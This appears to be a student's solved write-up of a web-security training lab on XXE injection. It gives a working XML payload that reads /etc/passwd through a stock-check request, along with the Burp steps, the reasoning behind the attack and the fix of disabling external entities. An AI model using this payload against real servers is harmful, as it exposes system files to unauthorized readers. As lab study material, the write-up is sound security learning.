# Lab 1: XXE to Retrieve Files
**Difficulty:** Apprentice
**Status:** ✅ Solved

## Vulnerability
XML parser processes external entities.
User controlled XML input reflected in response.

## Payload
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
Steps

Intercepted stock check request in Burp
Sent to Repeater
Added DOCTYPE with external entity pointing to /etc/passwd
Referenced &xxe; in productId
Response contained full /etc/passwd contents

The DOCKTYPE Lesson
Spent significant time debugging — turned out
I was writing DOCKTYPE instead of DOCTYPE.
One letter. Burned into memory forever. 😄
Why It Works
XML parser resolves &xxe; by fetching file:///etc/passwd
and substituting its contents into the response.
Fix
Disable external entity processing in XML parser.
Use safe XML parsing libraries with XXE disabled by default.

---

**File: PortSwigger/XXE/02-xxe-ssrf-aws-metadata.md**
